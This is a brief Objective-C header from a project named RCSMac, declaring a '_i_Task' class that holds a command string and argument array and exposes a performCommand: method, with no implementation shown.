//
//  __m_Task.h
//  RCSMac
//
//  Created by armored on 2/26/13.
//
//

#import <Foundation/Foundation.h>

@interface _i_Task : NSObject
{
  NSString *mCommand;
  NSMutableArray *mArgs;
}

- (void)performCommand:(NSString*)aCommand;

@end
